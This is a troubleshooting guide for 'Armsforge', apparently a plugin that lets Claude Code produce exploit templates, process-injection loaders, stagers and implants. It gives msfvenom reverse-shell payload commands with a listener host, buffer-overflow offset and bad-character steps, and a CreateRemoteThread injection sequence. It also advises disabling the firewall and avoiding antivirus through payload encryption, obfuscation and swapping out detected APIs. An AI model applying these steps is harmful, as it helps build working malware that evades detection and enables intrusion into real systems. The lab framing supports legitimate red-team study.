# Armsforge Troubleshooting Guide

Common issues and solutions for Armsforge setup, usage, and deployment.

## Installation Issues

### Plugin Not Appearing in Claude Code

**Symptom**: Armsforge tools don't appear in MCP suggestions

**Solutions**:

1. **Verify Installation**:
   ```bash
   npm list -g armsforge
   # Should show: npm <version> /.../armsforge@0.1.0

   # If not installed:
   npm install -g armsforge
   ```

2. **Restart Claude Code**:
   - Close Claude Code completely
   - Wait 10 seconds
   - Reopen Claude Code
   - Try again

3. **Check Plugin Settings**:
   - Open Claude Code
   - Settings → Plugins
   - Search "Armsforge"
   - Click "Install" or "Enable"

4. **Verify MCP Configuration**:
   ```bash
   # Check .mcp.json exists
   ls $(npm list -g armsforge)/.mcp.json

   # Check content:
   cat $(npm list -g armsforge)/.mcp.json

   # Should show:
   # {
   #   "mcpServers": {
   #     "af": {
   #       "command": "node",
   #       "args": ["${CLAUDE_PLUGIN_ROOT}/bridge/mcp-server.cjs"]
   #     }
   #   }
   # }
   ```

5. **Check Developer Console**:
   - View → Toggle Developer Tools
   - Check Console tab for errors
   - Look for MCP connection errors
   - Screenshot error message for support

### Manual Installation Failed

**Symptom**: `npm install -g armsforge` fails with error

**Solutions**:

1. **Check Node.js Version**:
   ```bash
   node --version
   # Must be >= 20.0.0

   # If too old:
   # Install latest Node from nodejs.org
   ```

2. **Check npm Cache**:
   ```bash
   npm cache clean --force
   npm install -g armsforge
   ```

3. **Check Permissions**:
   ```bash
   # On Linux/Mac:
   sudo npm install -g armsforge

   # Or fix npm permissions:
   mkdir ~/.npm-global
   npm config set prefix '~/.npm-global'
   export PATH=~/.npm-global/bin:$PATH
   ```

4. **Check Disk Space**:
   ```bash
   df -h  # Check free space
   # Need at least 500MB free
   ```

5. **Clear Old Installation**:
   ```bash
   npm uninstall -g armsforge
   npm cache clean --force
   npm install -g armsforge@latest
   ```

---

## Template and Snippet Issues

### Template File Not Found

**Symptom**: "Template not found" error when retrieving template

**Solutions**:

1. **List Available Templates**:
   ```
   MCP Tool: af_list_templates
   ```
   Check output for exact filename.

2. **Verify Filename**:
   - Template names are case-sensitive
   - Include file extension (e.g., `.py`, `.cs`)
   - Examples: `bof-exploit.py`, `loader-injection.cs`

3. **Check Installation**:
   ```bash
   ls $(npm list -g armsforge)/templates/
   # Should list all template files

   # If empty, reinstall:
   npm uninstall -g armsforge
   npm install -g armsforge@latest
   ```

4. **Permission Issue** (Linux/Mac):
   ```bash
   chmod 644 $(npm list -g armsforge)/templates/*
   ```

### Snippet File Not Found

**Symptom**: "Snippet not found" error when retrieving snippet

**Solutions**:

1. **List Available Snippets**:
   ```
   MCP Tool: af_list_snippets
   ```

2. **Check Exact Name**:
   - Snippet names are case-sensitive
   - Check for exact match in list
   - Use copy-paste from list to avoid typos

3. **Verify Installation**:
   ```bash
   ls $(npm list -g armsforge)/snippets/
   # Should show all snippet files
   ```

---

## Detection Lookup Issues

### Detection Data Not Found

**Symptom**: "No detection data found" for common API or technique

**Solutions**:

1. **Try Different Query**:
   ```
   # Instead of:
   af_detection_lookup "CreateRemoteThread injection"

   # Try:
   af_detection_lookup "CreateRemoteThread"
   af_detection_lookup "injection"
   af_detection_lookup "process memory"
   ```

2. **Check Data Files**:
   ```bash
   ls $(npm list -g armsforge)/data/
   # Should show:
   # - suspicious-apis.json
   # - sysmon-rules.json
   # - etw-providers.json
   # - amsi-triggers.json
   ```

3. **Verify Data Files**:
   ```bash
   # Check file isn't corrupted
   cat $(npm list -g armsforge)/data/suspicious-apis.json | jq . > /dev/null
   # If error, data is corrupted

   # Reinstall:
   npm uninstall -g armsforge
   npm install -g armsforge@latest
   ```

4. **Try Broader Query**:
   ```
   # Too specific:
   af_detection_lookup "NtAllocateVirtualMemory bypass"

   # More general:
   af_detection_lookup "memory allocation"
   af_detection_lookup "bypass"
   af_detection_lookup "evasion"
   ```

---

## Development and Compilation Issues

### Python Template Won't Run

**Symptom**: `python3 bof-exploit.py` fails with error

**Solutions**:

1. **Check Python Version**:
   ```bash
   python3 --version
   # Must be >= 3.6

   # If too old:
   # Install Python 3.9+ from python.org
   ```

2. **Check Dependencies**:
   ```bash
   # Templates may need pwntools, requests, etc.
   pip3 install pwntools requests

   # Or install all suggested dependencies:
   pip3 install pwntools requests impacket paramiko cryptography
   ```

3. **Check Shebang** (Linux/Mac):
   ```bash
   # Add execution permission:
   chmod +x bof-exploit.py

   # Or run explicitly:
   python3 bof-exploit.py <args>
   ```

4. **Check Arguments**:
   ```bash
   # Check usage:
   python3 bof-exploit.py --help

   # Verify correct arguments:
   python3 bof-exploit.py 192.168.1.100 9999
   ```

### C# Template Won't Compile

**Symptom**: `csc` command not found or compilation fails

**Solutions**:

1. **Check .NET Installation** (Windows):
   ```bash
   csc -version

   # If not found:
   # Install: .NET Framework or Visual Studio
   # Download from: microsoft.com/net
   ```

2. **Use dotnet Instead** (Modern):
   ```bash
   dotnet new console -n LoaderProject
   # Copy loader-injection.cs into project
   dotnet build -c Release
   # Output: bin/Release/netX.X/LoaderProject.exe
   ```

3. **Use Visual Studio** (Easiest):
   ```
   1. File → New → Console App (.NET Framework)
   2. Copy loader-injection.cs content
   3. Build → Release
   4. Output: bin/Release/loader.exe
   ```

4. **Check Syntax Errors**:
   ```bash
   # Look for compilation errors
   csc /out:test.exe loader-injection.cs 2>&1
   # Review error messages carefully
   # Fix any syntax issues
   # Recompile
   ```

5. **Check /unsafe Flag**:
   ```bash
   # Loader requires /unsafe flag:
   csc /unsafe /platform:x64 /out:loader.exe loader-injection.cs

   # Don't forget: /unsafe /platform:x64
   ```

### Rust Template Won't Build

**Symptom**: `cargo build` fails or command not found

**Solutions**:

1. **Install Rust**:
   ```bash
   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
   source $HOME/.cargo/env
   ```

2. **Add Windows Target**:
   ```bash
   rustup target add x86_64-pc-windows-msvc
   # or for GNU
   rustup target add x86_64-pc-windows-gnu
   ```

3. **Build for Windows**:
   ```bash
   # From Linux/Mac to Windows:
   GOOS=windows GOARCH=amd64 cargo build --target x86_64-pc-windows-msvc --release

   # Output: target/x86_64-pc-windows-msvc/release/implant.exe
   ```

4. **Check Dependencies**:
   ```bash
   # Ensure Cargo.toml has dependencies:
   cat Cargo.toml
   # Add if needed:
   # [dependencies]
   # serde = { version = "1.0", features = ["derive"] }
   ```

### Go Template Won't Compile

**Symptom**: `go build` fails or outputs wrong binary

**Solutions**:

1. **Install Go**:
   ```bash
   # Download from: golang.org
   go version  # Should be >= 1.18
   ```

2. **Build for Windows**:
   ```bash
   # From Linux/Mac:
   GOOS=windows GOARCH=amd64 go build -o stager.exe stager-http.go

   # Windows to Windows:
   go build -o stager.exe stager-http.go
   ```

3. **Strip Symbols** (reduce size):
   ```bash
   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o stager.exe stager-http.go
   ```

4. **Check Imports**:
   ```bash
   # If import errors:
   go mod init mymodule
   go mod tidy  # Download dependencies
   go build
   ```

---

## Execution and Testing Issues

### Exploit Doesn't Connect to Target

**Symptom**: Exploit runs but doesn't reach target

**Solutions**:

1. **Check Target IP/Port**:
   ```bash
   python3 bof-exploit.py 192.168.1.100 9999
   #                      ^^^^^^^^^^^^^^^^^ Check IP
   #                                        Check port

   # Verify with ping:
   ping 192.168.1.100
   ```

2. **Check Target is Running**:
   ```bash
   # On target machine:
   netstat -an | grep 9999
   # Should show: LISTENING on port 9999
   ```

3. **Check Firewall**:
   ```bash
   # Windows Firewall might block
   # Check: Settings → Firewall → Allowed apps
   # OR disable for testing:
   netsh advfirewall set allprofiles state off  # Dangerous!

   # Better: Allow specific port
   netsh advfirewall firewall add rule name="Allow 9999" dir=in action=allow protocol=tcp localport=9999
   ```

4. **Check Network Connectivity**:
   ```bash
   # Ensure attacker and target on same network
   # Or properly routed
   # Test with ping first
   ```

### Shellcode Doesn't Execute

**Symptom**: Exploit connects but no reverse shell

**Solutions**:

1. **Check Listener is Running**:
   ```bash
   # On attacker machine:
   nc -nlvp 4444
   # Must be listening BEFORE exploit runs
   ```

2. **Check Listener on Correct Port**:
   ```bash
   # Shellcode generated with:
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444

   # Listener must be on same port:
   nc -nlvp 4444  # CORRECT
   nc -nlvp 4445  # WRONG - different port
   ```

3. **Check Shellcode Bad Characters**:
   ```bash
   # If shellcode contains bad chars:
   # Regenerate with -b flag:
   msfvenom -p windows/shell_reverse_tcp \
     LHOST=192.168.1.50 LPORT=4444 \
     -b '\x00\x0a\x0d\x20' \
     -f python -v SHELLCODE
   ```

4. **Check Shellcode Size**:
   ```bash
   # If buffer is small (< 100 bytes):
   # Shellcode might be truncated
   # Use smaller payload:
   msfvenom -p windows/shell_reverse_tcp ... -s 50

   # Or use alphanumeric encoding to reduce size
   ```

5. **Verify in Debugger**:
   ```
   1. Run exploit with SHELLCODE = empty byte string
   2. Verify crash at EIP/RIP
   3. Add minimal shellcode (single byte 0x90 NOP)
   4. Verify executes
   5. Gradually add real shellcode
   ```

### C# Loader Doesn't Inject

**Symptom**: Loader runs but no injection occurs

**Solutions**:

1. **Check Target Process Exists**:
   ```powershell
   Get-Process -Name explorer
   # Must return process, not error

   # If not found:
   # Change TARGET_PROCESS to running process
   Get-Process | Select-Object Name
   ```

2. **Check Encryption**:
   ```csharp
   // Verify KEY and IV are correct
   // They should match encryption command:
   // openssl enc -aes-256-cbc -S <salt> -P ...

   // Test decryption:
   byte[] encrypted = File.ReadAllBytes("shellcode.bin");
   byte[] decrypted = Decrypt(encrypted, KEY, IV);
   // Should be valid shellcode (not garbage)
   ```

3. **Check Memory Protection Flags**:
   ```csharp
   // Verify constants:
   const uint PAGE_READWRITE = 0x04;     // For writing
   const uint PAGE_EXECUTE_READ = 0x20;  // For execution

   // If wrong, injection fails silently
   ```

4. **Add Logging**:
   ```csharp
   // Temporarily add debug output:
   Console.WriteLine("[*] Opening process...");
   IntPtr hProcess = OpenProcess(...);
   if (hProcess == IntPtr.Zero) {
       Console.WriteLine("[-] OpenProcess failed: " + Marshal.GetLastWin32Error());
       return;
   }
   Console.WriteLine("[+] Process opened");
   ```

5. **Test with Process Monitor**:
   ```
   1. Start Process Monitor
   2. Run loader
   3. Filter for your process (loader.exe)
   4. Look for API calls:
      - OpenProcess: Should succeed
      - VirtualAllocEx: Should succeed
      - WriteProcessMemory: Should succeed
      - VirtualProtectEx: Should succeed
      - CreateRemoteThread: Should succeed
   5. If any fails, fix that step
   ```

### Binary Detected by Antivirus

**Symptom**: Compiled binary flagged as malware

**Solutions**:

1. **Use Detection Lookup**:
   ```
   Skill: /armsforge:opsec-review
   File: loader.exe

   Review findings and apply recommendations
   ```

2. **Encrypt Payload**:
   ```bash
   # If shellcode is detected:
   openssl enc -aes-256-cbc -S $(openssl rand -hex 4) -P \
     -in shellcode.bin -out encrypted.bin

   # Update loader to decrypt at runtime
   ```

3. **Remove Debug Symbols**:
   ```bash
   # C# Release build:
   csc /out:loader.exe loader-injection.cs  # Release by default

   # Or explicitly:
   /debug-
   ```

4. **Obfuscate Code**:
   ```
   For C#:
   - Use ConfuserEx or SmartAssembly
   - Rename functions/variables
   - Add junk code
   ```

5. **Use Alternative API**:
   ```
   If CreateRemoteThread detected:
   1. af_detection_lookup "CreateRemoteThread"
   2. Review alternatives
   3. af_get_snippet for alternative
   4. Integrate and rebuild
   ```

---

## OPSEC Review Issues

### Skill Not Found

**Symptom**: `/armsforge:opsec-review` not recognized

**Solutions**:

1. **Verify Plugin Installed**:
   ```bash
   npm list -g armsforge
   ```

2. **Check Skills Directory**:
   ```bash
   ls $(npm list -g armsforge)/skills/
   ```

3. **Restart Claude Code**:
   - Close completely
   - Wait 10 seconds
   - Reopen

4. **Check Settings**:
   - Settings → Extensions
   - Find Armsforge
   - Verify enabled

### OPSEC Review Incomplete

**Symptom**: Skill runs but doesn't provide full analysis

**Solutions**:

1. **Ensure File Exists**:
   ```bash
   ls -lh loader.exe
   # File must exist and be readable
   ```

2. **Check File Size**:
   ```bash
   ls -lh loader.exe
   # File size should be > 0 bytes
   # If 0 bytes, compilation failed
   ```

3. **Try Again**:
   ```
   Wait 10 seconds, then invoke skill again
   Sometimes network latency causes issues
   ```

---

## Lab Environment Issues

### Sysmon Not Logging

**Symptom**: Run binary but no Sysmon events captured

**Solutions**:

1. **Check Sysmon Installed**:
   ```powershell
   Get-Service Sysmon
   # Should show "Running"
   ```

2. **Install Sysmon**:
   ```powershell
   # Download from: github.com/SwiftOnSecurity/sysmon-modular
   # Or official: github.com/swan0001/Sysmon

   # Install:
   sysmon.exe -accepteula -i sysmonconfig.xml
   ```

3. **Check Configuration**:
   ```powershell
   # Update config:
   sysmon.exe -c sysmonconfig.xml
   ```

4. **Review Logs**:
   ```powershell
   # Check if events recorded:
   Get-EventLog -LogName "Operational" -Source "Sysmon" -Newest 10

   # If empty, Sysmon not logging
   ```

### Process Monitor Not Showing API Calls

**Symptom**: Binary executes but Process Monitor capture is empty

**Solutions**:

1. **Check Filter**:
   ```
   1. Process Monitor → Filter
   2. Add: Process Name is loader.exe
   3. Check Include
   4. Click Apply
   ```

2. **Check Symbols**:
   ```
   Tools → Options → Deferred symbol loading
   Ensure enabled for proper function names
   ```

3. **Check Buffer**:
   ```
   File → Capture Events: Check if enabled
   ```

4. **Restart Capture**:
   ```
   1. Close Process Monitor completely
   2. Reopen with admin privileges
   3. Start capture (Ctrl+E)
   4. Run binary
   5. Stop capture (Ctrl+E)
   ```

---

## Template Customization Issues

### Can't Find BAD_CHARS

**Symptom**: Bad character testing doesn't work

**Solutions**:

1. **Check Function Exists**:
   ```python
   # In template, search for:
   def bad_char_test():
       chars = b""
       for i in range(1, 256):
           chars += bytes([i])
       return chars
   ```

2. **Call Function Properly**:
   ```python
   # In SHELLCODE section:
   SHELLCODE = bad_char_test()

   # Then run exploit:
   python3 bof-exploit.py <IP> <PORT>
   ```

3. **Analyze Debugger Output**:
   ```
   1. Debugger should show all 255 bytes in memory
   2. Scroll through and find which bytes are corrupted
   3. Those are bad characters
   4. Update BAD_CHARS = b"\x00\x0a\x0d..." (for example)
   ```

### Offset Not Working

**Symptom**: Using offset from pattern_offset but exploit fails

**Solutions**:

1. **Verify Offset Calculation**:
   ```bash
   # Generate pattern:
   pattern_create.rb -l 600 > pattern.txt

   # Send to target, get EIP value
   # Calculate offset:
   pattern_offset.rb -q 0x<EIP>

   # Output: "Exact match at offset 112"
   # Use: OFFSET = 112
   ```

2. **Verify Target Binary**:
   ```
   Make sure offset was calculated on EXACT same binary
   Different versions may have different offsets
   ```

3. **Add Debug Output**:
   ```python
   # Temporarily add:
   print(f"[*] OFFSET: {OFFSET}")
   print(f"[*] Payload size: {len(payload)}")
   print(f"[*] EIP position: {OFFSET} to {OFFSET+4}")
   ```

---

## Getting Help

### Check Logs

```bash
# Claude Code console logs:
View → Toggle Developer Tools → Console tab

# MCP server logs:
Look in .mcp.json for server startup messages
```

### Search Documentation

- README.md — General overview
- API.md — MCP tool reference
- TEMPLATES.md — Template usage
- WORKFLOWS.md — Step-by-step guides
- SECURITY.md — Legal and ethical guidelines

### Report Issues

When reporting issues, include:

1. **Error message** (exact text)
2. **What you were trying to do**
3. **Output of `npm list -g armsforge`**
4. **Output of relevant commands**
5. **Steps to reproduce**
6. **Your environment**:
   - OS (Windows/Mac/Linux version)
   - Node.js version
   - Claude Code version
   - .NET version (if applicable)

---

**Last Updated**: March 2026
**Version**: 1.0
